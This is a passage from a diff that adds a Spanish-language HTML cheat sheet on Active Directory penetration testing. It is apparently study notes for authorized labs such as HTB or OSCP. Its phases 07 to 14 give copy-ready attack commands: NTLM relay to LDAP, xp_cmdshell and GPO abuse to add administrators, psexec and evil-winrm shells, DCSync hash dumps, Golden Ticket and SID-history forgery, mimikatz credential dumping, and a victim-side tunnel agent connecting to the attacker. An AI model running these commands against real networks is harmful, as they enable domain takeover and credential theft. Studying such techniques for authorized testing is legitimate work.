+<span class="p">petitpotam.py</span> -u <span class="v">$USER</span> -p <span class="v">$PASS</span> <span class="v">$ATACANTE</span> <span class="v">$DC</span>
+<span class="c"># 3) Autentica con el cert del DC -> hash de la cuenta máquina -> DCSync</span>
+<span class="p">certipy</span> auth -pfx dc.pfx -dc-ip <span class="v">$DC</span></pre>
+      </div>
+
+      <h3>Relay a LDAP (RBCD) <span class="tag r">auth</span></h3>
+      <div class="cmd" data-code="impacket-ntlmrelayx -t ldap://$DC --delegate-access --escalate-user $USER -smb2support
+# tras el relay: configura RBCD y salta con getST (fase 05)">
+        <div class="bar"><span class="label">bash · relay a LDAP</span><button>copiar</button></div>
+        <pre><span class="c"># Relay a LDAP para configurar RBCD sobre la víctima</span>
+<span class="p">impacket-ntlmrelayx</span> -t ldap://<span class="v">$DC</span> --delegate-access --escalate-user <span class="v">$USER</span> -smb2support</pre>
+      </div>
+      <div class="tip red"><b>Requisito del relay.</b> El destino no debe exigir firma: SMB relay necesita <code>signing:False</code> (mira el barrido de la fase 01), y el relay a LDAP requiere que LDAP signing / channel binding no estén forzados.</div>
+    </section>
+
+    <!-- 08 abuso de servicios -->
+    <section id="f8">
+      <div class="phase"><span class="num">08</span><h2>Abuso de servicios internos</h2></div>
+      <p class="lead">Fuentes de credenciales y ejecución que aparecen constantemente: MSSQL, políticas de grupo (GPO/GPP), y secretos gestionados (LAPS, gMSA).</p>
+
+      <h3>MSSQL <span class="tag r">auth</span></h3>
+      <div class="cmd" data-code="netexec mssql $TARGET -u $USER -p $PASS
+impacket-mssqlclient $DOMAIN/$USER:$PASS@$TARGET -windows-auth
+# dentro:  enable_xp_cmdshell  ->  xp_cmdshell whoami
+#          enum_links  ->  saltar por servidores enlazados
+#          exec_as_login / exec_as_user  ->  impersonación">
+        <div class="bar"><span class="label">bash · mssqlclient</span><button>copiar</button></div>
+        <pre><span class="p">netexec</span> mssql <span class="v">$TARGET</span> -u <span class="v">$USER</span> -p <span class="v">$PASS</span>
+<span class="p">impacket-mssqlclient</span> <span class="v">$DOMAIN</span>/<span class="v">$USER</span>:<span class="v">$PASS</span>@<span class="v">$TARGET</span> -windows-auth
+<span class="c"># enable_xp_cmdshell -> xp_cmdshell whoami</span>
+<span class="c"># enum_links -> pivotar por servidores enlazados</span>
+<span class="c"># exec_as_login / exec_as_user -> impersonación</span></pre>
+      </div>
+
+      <h3>GPP y GPO <span class="tag r">auth</span></h3>
+      <div class="cmd" data-code="# cpassword en SYSVOL (clave AES pública -> descifrable)
+netexec smb $DC -u $USER -p $PASS -M gpp_password
+# Con derechos de edición sobre una GPO -> ejecución en los equipos afectados
+python3 pyGPOAbuse.py $DOMAIN/$USER:$PASS -gpo-id '<GUID>' -command 'net localgroup administrators $USER /add'">
+        <div class="bar"><span class="label">bash · GPP / GPO abuse</span><button>copiar</button></div>
+        <pre><span class="c"># cpassword en SYSVOL (descifrable con clave AES conocida)</span>
+<span class="p">netexec</span> smb <span class="v">$DC</span> -u <span class="v">$USER</span> -p <span class="v">$PASS</span> -M gpp_password
+<span class="c"># Con WriteProperty sobre una GPO -> ejecutas en los equipos que la aplican</span>
+<span class="p">pyGPOAbuse.py</span> <span class="v">$DOMAIN</span>/<span class="v">$USER</span>:<span class="v">$PASS</span> -gpo-id '&lt;GUID&gt;' \
+  -command 'net localgroup administrators <span class="v">$USER</span> /add'</pre>
+      </div>
+
+      <h3>LAPS y gMSA <span class="tag r">auth</span></h3>
+      <div class="cmd" data-code="# LAPS: contraseña de admin local rotada, legible si tienes permiso
+netexec ldap $DC -u $USER -p $PASS -M laps
+# gMSA: si puedes leer el blob, derivas el hash NT de la cuenta de servicio
+netexec ldap $DC -u $USER -p $PASS --gmsa">
+        <div class="bar"><span class="label">bash · LAPS / gMSA</span><button>copiar</button></div>
+        <pre><span class="c"># LAPS: password de admin local de cada equipo (si tienes el permiso de lectura)</span>
+<span class="p">netexec</span> ldap <span class="v">$DC</span> -u <span class="v">$USER</span> -p <span class="v">$PASS</span> -M laps
+<span class="c"># gMSA: lee el blob y deriva el hash NT de la cuenta gestionada</span>
+<span class="p">netexec</span> ldap <span class="v">$DC</span> -u <span class="v">$USER</span> -p <span class="v">$PASS</span> --gmsa</pre>
+      </div>
+    </section>
+
+    <!-- 09 movimiento lateral -->
+    <section id="f9">
+      <div class="phase"><span class="num">09</span><h2>Movimiento lateral</h2></div>
+      <p class="lead">Tienes credencial/hash/ticket que es admin local en algún host. Consigue ejecución remota según qué puerto está abierto y cuánto ruido puedes permitirte.</p>
+
+      <h3>Shells remotas con Impacket <span class="tag r">auth</span></h3>
+      <div class="cmd" data-code="impacket-psexec $DOMAIN/$USER:$PASS@$TARGET       # SYSTEM, ruidoso
+impacket-wmiexec $DOMAIN/$USER:$PASS@$TARGET      # sigiloso (WMI)
+impacket-smbexec $DOMAIN/$USER:$PASS@$TARGET
+impacket-atexec $DOMAIN/$USER:$PASS@$TARGET whoami">
+        <div class="bar"><span class="label">bash · *exec de Impacket</span><button>copiar</button></div>
+        <pre><span class="p">impacket-psexec</span>  <span class="v">$DOMAIN</span>/<span class="v">$USER</span>:<span class="v">$PASS</span>@<span class="v">$TARGET</span>   <span class="c"># SYSTEM, ruidoso</span>
+<span class="p">impacket-wmiexec</span> <span class="v">$DOMAIN</span>/<span class="v">$USER</span>:<span class="v">$PASS</span>@<span class="v">$TARGET</span>   <span class="c"># WMI, sigiloso</span>
+<span class="p">impacket-smbexec</span> <span class="v">$DOMAIN</span>/<span class="v">$USER</span>:<span class="v">$PASS</span>@<span class="v">$TARGET</span>
+<span class="p">impacket-atexec</span>  <span class="v">$DOMAIN</span>/<span class="v">$USER</span>:<span class="v">$PASS</span>@<span class="v">$TARGET</span> whoami</pre>
+      </div>
+
+      <h3>WinRM, Pass-the-Hash y Pass-the-Ticket <span class="tag r">auth</span></h3>
+      <div class="cmd" data-code="evil-winrm -i $TARGET -u $USER -p $PASS
+evil-winrm -i $TARGET -u $USER -H $HASH          # PtH
+impacket-wmiexec -hashes :$HASH $DOMAIN/$USER@$TARGET
+# PtT:
+export KRB5CCNAME=ticket.ccache
+impacket-psexec -k -no-pass $DOMAIN/$USER@$TARGET">
+        <div class="bar"><span class="label">bash · WinRM + PtH + PtT</span><button>copiar</button></div>
+        <pre><span class="p">evil-winrm</span> -i <span class="v">$TARGET</span> -u <span class="v">$USER</span> -p <span class="v">$PASS</span>
+<span class="p">evil-winrm</span> -i <span class="v">$TARGET</span> -u <span class="v">$USER</span> -H <span class="v">$HASH</span>       <span class="c"># Pass-the-Hash</span>
+<span class="p">impacket-wmiexec</span> -hashes :<span class="v">$HASH</span> <span class="v">$DOMAIN</span>/<span class="v">$USER</span>@<span class="v">$TARGET</span>
+<span class="c"># Pass-the-Ticket:</span>
+<span class="p">export</span> KRB5CCNAME=ticket.ccache
+<span class="p">impacket-psexec</span> -k -no-pass <span class="v">$DOMAIN</span>/<span class="v">$USER</span>@<span class="v">$TARGET</span></pre>
+      </div>
+    </section>
+
+    <!-- 10 escalada de dominio -->
+    <section id="f10">
+      <div class="phase"><span class="num">10</span><h2>Escalada a Domain Admin</h2></div>
+      <p class="lead">El objetivo final. Casi siempre pasa por conseguir los hashes del dominio (DCSync) o comprometer directamente el DC.</p>
+
+      <h3>DCSync <span class="tag r">auth</span></h3>
+      <p class="note">Con derechos de replicación (<code>DS-Replication-Get-Changes</code> — BloodHound los marca), pides al DC que replique los hashes, incluido <code>krbtgt</code>. No hace falta pisar el DC.</p>
+      <div class="cmd" data-code="impacket-secretsdump $DOMAIN/$USER:$PASS@$DC -just-dc
+impacket-secretsdump $DOMAIN/$USER:$PASS@$DC -just-dc-user krbtgt
+impacket-secretsdump $DOMAIN/$USER:$PASS@$DC -just-dc-user Administrator">
+        <div class="bar"><span class="label">bash · secretsdump / DCSync</span><button>copiar</button></div>
+        <pre><span class="c"># Vuelca TODOS los hashes NTDS del dominio</span>
+<span class="p">impacket-secretsdump</span> <span class="v">$DOMAIN</span>/<span class="v">$USER</span>:<span class="v">$PASS</span>@<span class="v">$DC</span> -just-dc
+<span class="c"># Solo krbtgt (para el Golden Ticket de la fase 13)</span>
+<span class="p">impacket-secretsdump</span> <span class="v">$DOMAIN</span>/<span class="v">$USER</span>:<span class="v">$PASS</span>@<span class="v">$DC</span> -just-dc-user krbtgt</pre>
+      </div>
+
+      <h3>Escalada local en un host <span class="tag r">auth</span></h3>
+      <ul class="tight">
+        <li>Triaje automático con <b>winPEAS</b> / <b>PrivescCheck</b>.</li>
+        <li><code>whoami /priv</code>. Con <code>SeImpersonatePrivilege</code> → familia <b>Potato</b> (PrintSpoofer, GodPotato) → SYSTEM.</li>
+        <li>Servicios con permisos débiles, tareas programadas, GPP <code>cpassword</code>, <b>unattend.xml</b>.</li>
+      </ul>
+      <div class="cmd" data-code="whoami /priv
+PrintSpoofer.exe -i -c cmd
+GodPotato -cmd \"cmd /c whoami\"">
+        <div class="bar"><span class="label">windows · SeImpersonate → SYSTEM</span><button>copiar</button></div>
+        <pre><span class="p">whoami</span> /priv
+<span class="c"># Si SeImpersonatePrivilege está habilitado:</span>
+<span class="p">PrintSpoofer.exe</span> -i -c cmd
+<span class="p">GodPotato</span> -cmd "cmd /c whoami"</pre>
+      </div>
+    </section>
+
+    <!-- 11 trusts -->
+    <section id="f11">
+      <div class="phase"><span class="num">11</span><h2>Trusts entre dominios y bosques</h2></div>
+      <p class="lead">Ser DA de un dominio no siempre es el final: si hay relaciones de confianza, puedes saltar a otros dominios del bosque o a bosques externos. La clave es el SID history y los tickets inter-realm.</p>
+
+      <h3>Enumerar confianzas <span class="tag r">auth</span></h3>
+      <div class="cmd" data-code="netexec ldap $DC -u $USER -p $PASS -M enum_trusts
+impacket-lookupsid $DOMAIN/$USER:$PASS@$DC       # SID del dominio
+nltest /domain_trusts /all_trusts                # desde un host Windows">
+        <div class="bar"><span class="label">bash · enumerar trusts</span><button>copiar</button></div>
+        <pre><span class="p">netexec</span> ldap <span class="v">$DC</span> -u <span class="v">$USER</span> -p <span class="v">$PASS</span> -M enum_trusts
+<span class="p">impacket-lookupsid</span> <span class="v">$DOMAIN</span>/<span class="v">$USER</span>:<span class="v">$PASS</span>@<span class="v">$DC</span>
+<span class="c"># En BloodHound: la arista 'TrustedBy' muestra la dirección</span></pre>
+      </div>
+
+      <h3>Child → Parent: ataque al bosque <span class="tag v">kerberos</span> <span class="tag r">auth</span></h3>
+      <p class="note">Siendo DA de un dominio hijo, forjas un Golden Ticket con SID history del grupo Enterprise Admins del padre → DA de todo el bosque.</p>
+      <div class="cmd" data-code="# Necesitas: krbtgt del hijo, SID del hijo, y SID de Enterprise Admins del padre (-519)
+impacket-ticketer -nthash $KRBTGT_HIJO -domain-sid $SID_HIJO -domain hijo.corp.local \
+  -extra-sid $SID_PADRE-519 Administrator
+export KRB5CCNAME=Administrator.ccache
+impacket-secretsdump -k -no-pass hijo.corp.local/Administrator@dc-padre.corp.local -just-dc">
+        <div class="bar"><span class="label">bash · SID history / inter-realm</span><button>copiar</button></div>
+        <pre><span class="c"># Golden Ticket con extra-SID = Enterprise Admins (-519) del padre</span>
+<span class="p">impacket-ticketer</span> -nthash <span class="v">$KRBTGT_HIJO</span> -domain-sid <span class="v">$SID_HIJO</span> \
+  -domain hijo.corp.local -extra-sid <span class="v">$SID_PADRE</span>-519 Administrator
+<span class="p">export</span> KRB5CCNAME=Administrator.ccache
+<span class="p">impacket-secretsdump</span> -k -no-pass \
+  hijo.corp.local/Administrator@dc-padre.corp.local -just-dc</pre>
+      </div>
+      <div class="tip amber"><b>Trusts externos.</b> Entre bosques distintos revisa el <b>trust key</b> (secreto de la relación, vía <code>secretsdump</code>) para forjar tickets inter-realm, y ten en cuenta el <b>SID filtering</b>, que puede bloquear el abuso de SID history.</div>
+    </section>
+
+    <!-- 12 post-explotación -->
+    <section id="f12">
+      <div class="phase"><span class="num">12</span><h2>Post-explotación: cosecha de credenciales</h2></div>
+      <p class="lead">Como admin local o de dominio, extrae todo el material de credenciales para pivotar y persistir.</p>
+
+      <h3>Volcado local <span class="tag r">auth</span></h3>
+      <div class="cmd" data-code="# mimikatz (en el host, como admin):
+privilege::debug
+sekurlsa::logonpasswords
+lsadump::sam
+# Remoto con NetExec:
+netexec smb $TARGET -u $USER -p $PASS --sam --lsa
+netexec smb $TARGET -u $USER -p $PASS -M lsassy">
+        <div class="bar"><span class="label">mixed · mimikatz / lsassy</span><button>copiar</button></div>
+        <pre><span class="c"># mimikatz (en el host, como admin):</span>
+<span class="p">privilege::debug</span>
+<span class="p">sekurlsa::logonpasswords</span>
+<span class="p">lsadump::sam</span>
+<span class="c"># Remoto y más limpio con NetExec:</span>
+<span class="p">netexec</span> smb <span class="v">$TARGET</span> -u <span class="v">$USER</span> -p <span class="v">$PASS</span> --sam --lsa
+<span class="p">netexec</span> smb <span class="v">$TARGET</span> -u <span class="v">$USER</span> -p <span class="v">$PASS</span> -M lsassy</pre>
+      </div>
+
+      <h3>Pivoting hacia segmentos internos <span class="tag r">auth</span></h3>
+      <div class="cmd" data-code="# Túnel SOCKS con ligolo-ng o chisel:
+#   (atacante) ./proxy -selfcert
+#   (víctima)  ./agent -connect $ATACANTE:11601
+proxychains netexec smb 172.16.0.0/24 -u $USER -H $HASH">
+        <div class="bar"><span class="label">bash · pivoting</span><button>copiar</button></div>
+        <pre><span class="c"># Levanta un túnel (ligolo-ng / chisel) y encadena por la red interna</span>
+<span class="p">proxychains</span> netexec smb 172.16.0.0/24 -u <span class="v">$USER</span> -H <span class="v">$HASH</span></pre>
+      </div>
+      <div class="tip amber"><b>Anota cada secreto.</b> Cada hash, ticket, cert y contraseña reinicia el bucle de la fase 03: valida dónde vale el nuevo material antes de asumir que has terminado.</div>
+    </section>
+
+    <!-- 13 persistencia -->
+    <section id="f13">
+      <div class="phase"><span class="num">13</span><h2>Persistencia</h2></div>
+      <p class="lead">En un examen/lab querrás mantener acceso. En un engagement real, solo con autorización explícita y documentando cada artefacto para limpiarlo.</p>
+
+      <h3>Golden Ticket <span class="tag v">kerberos</span> <span class="tag r">auth</span></h3>
+      <p class="note">Con el hash de <code>krbtgt</code> forjas TGTs arbitrarios: cualquier usuario, cualquier grupo, validez larga. Persistencia a nivel de dominio.</p>
+      <div class="cmd" data-code="impacket-ticketer -nthash $KRBTGT_HASH -domain-sid $SID -domain $DOMAIN Administrator
+export KRB5CCNAME=Administrator.ccache
+impacket-psexec -k -no-pass $DOMAIN/Administrator@$DC">
+        <div class="bar"><span class="label">bash · ticketer (Golden)</span><button>copiar</button></div>
+        <pre><span class="p">impacket-ticketer</span> -nthash <span class="v">$KRBTGT_HASH</span> -domain-sid <span class="v">$SID</span> \
+  -domain <span class="v">$DOMAIN</span> Administrator
+<span class="p">export</span> KRB5CCNAME=Administrator.ccache
+<span class="p">impacket-psexec</span> -k -no-pass <span class="v">$DOMAIN</span>/Administrator@<span class="v">$DC</span></pre>
+      </div>
+
+      <h3>Otras vías <span class="tag r">auth</span></h3>
+      <ul class="tight">
+        <li><b>Silver Ticket:</b> con el hash de una cuenta de servicio, forjas TGS para ese servicio (no toca el DC).</li>
+        <li><b>Certificado persistente (AD CS):</b> un <code>.pfx</code> de la fase 06 sigue autenticando aunque cambien la contraseña; vigencia de años.</li>
+        <li><b>DCSync recurrente</b> con derechos de replicación otorgados a una cuenta tuya.</li>
+        <li><b>Skeleton Key</b> (<code>lsadump::misc</code>) — contraseña maestra en el DC. Muy ruidosa.</li>
+        <li><b>AdminSDHolder / ACL backdoor:</b> derechos persistentes sobre objetos protegidos.</li>
+      </ul>
+      <div class="tip red"><b>Higiene de laboratorio.</b> El hash de <code>krbtgt</code> y los Golden Tickets sobreviven a cambios de contraseña; los certificados de AD CS también. Documenta todo lo que forjes; en entornos reales exige doble rotación de <code>krbtgt</code> y revocación de certs para limpiar.</div>
+    </section>
+
+    <!-- 14 chuleta -->
+    <section id="f14">
+      <div class="phase"><span class="num">14</span><h2>Chuleta rápida</h2></div>
+      <p class="lead">Orden mental para no atascarte, y el kit de herramientas por categoría.</p>
+
+      <h3>Secuencia por defecto</h3>
+      <ul class="tight">
+        <li><b>1.</b> nmap → identifica DC, dominio, SMB signing.</li>
+        <li><b>2.</b> ¿anónimo? → shares, usuarios (rpcclient / netexec / ldap).</li>
+        <li><b>3.</b> Lista de usuarios → kerbrute → AS-REP roast → spray suave.</li>
+        <li><b>4.</b> Primera credencial → netexec por toda la red (busca <code>Pwn3d!</code>).</li>
+        <li><b>5.</b> BloodHound → camino más corto a DA.</li>
+        <li><b>6.</b> Kerberoast + ACL/delegación + <b>certipy find</b> (AD CS suele ser el atajo).</li>
+        <li><b>7.</b> ¿coerción posible? → relay a AD CS (ESC8) o a LDAP (RBCD).</li>
+        <li><b>8.</b> MSSQL / GPP / LAPS / gMSA → más credenciales.</li>
+        <li><b>9.</b> ¿DCSync? → secretsdump → krbtgt + Administrator.</li>
+        <li><b>10.</b> ¿trusts? → salto a otros dominios/bosques (SID history).</li>
+        <li><b>11.</b> Volcado, pivoting y persistencia si procede.</li>
+      </ul>
+
+      <h3>Kit por categoría</h3>
+      <ul class="tight">
+        <li><b>Barrido/validación:</b> netexec (crackmapexec), enum4linux-ng, rpcclient.</li>
+        <li><b>Usuarios/Kerberos:</b> kerbrute, impacket-GetNPUsers, impacket-GetUserSPNs.</li>
+        <li><b>Mapa:</b> bloodhound-python + BloodHound GUI, ldapdomaindump, bloodyAD.</li>
+        <li><b>AD CS:</b> certipy (find / req / auth / template).</li>
+        <li><b>Coerción/Relay:</b> petitpotam, coercer, printerbug, impacket-ntlmrelayx.</li>
+        <li><b>Servicios:</b> impacket-mssqlclient, pyGPOAbuse, módulos <code>laps</code>/<code>gmsa</code> de netexec.</li>
+        <li><b>Ejecución:</b> impacket-psexec/wmiexec/smbexec, evil-winrm.</li>
+        <li><b>Credenciales:</b> impacket-secretsdump, mimikatz, lsassy, Rubeus.</li>
+        <li><b>Cracking:</b> hashcat (18200 AS-REP · 13100 TGS · 5600 NetNTLMv2 · 1000 NTLM).</li>
+        <li><b>Pivoting:</b> ligolo-ng, chisel, proxychains, sshuttle.</li>
+        <li><b>Privesc local:</b> winPEAS, PrivescCheck, PrintSpoofer, GodPotato.</li>
+      </ul>
+      <div class="tip"><b>Referencias vivas.</b> Para profundizar: el mind map de AD de Orange Cyberdefense, The Hacker Recipes (ad), HackTricks (Windows/AD) y los módulos de AD y AD CS de HTB Academy. Esta chuleta es el índice; ahí están los detalles de cada abuso.</div>
+    </section>
+
+    <footer>
+      Apuntes de metodología · uso en laboratorios autorizados (HTB / OSCP) · g0nxz
+    </footer>
+  </main>
+</div>
+
+<script>
+  document.querySelectorAll('.cmd').forEach(function(block){
+    var btn = block.querySelector('button');
+    if(!btn) return;
+    btn.addEventListener('click', function(){
+      var code = block.getAttribute('data-code') || block.querySelector('pre').innerText;
+      var done = function(){
+        btn.textContent = 'copiado ✓';
+        btn.classList.add('ok');
+        setTimeout(function(){ btn.textContent = 'copiar'; btn.classList.remove('ok'); }, 1600);
+      };
+      if(navigator.clipboard && navigator.clipboard.writeText){
+        navigator.clipboard.writeText(code).then(done).catch(function(){ fallback(); });
+      } else { fallback(); }
+      function fallback(){
+        var r = document.createRange();
+        r.selectNodeContents(block.querySelector('pre'));
+        var s = window.getSelection(); s.removeAllRanges(); s.addRange(r);
+        try { document.execCommand('copy'); done(); } catch(e){}
+      }
+    });
+  });
+</script>
+
+</body></html>
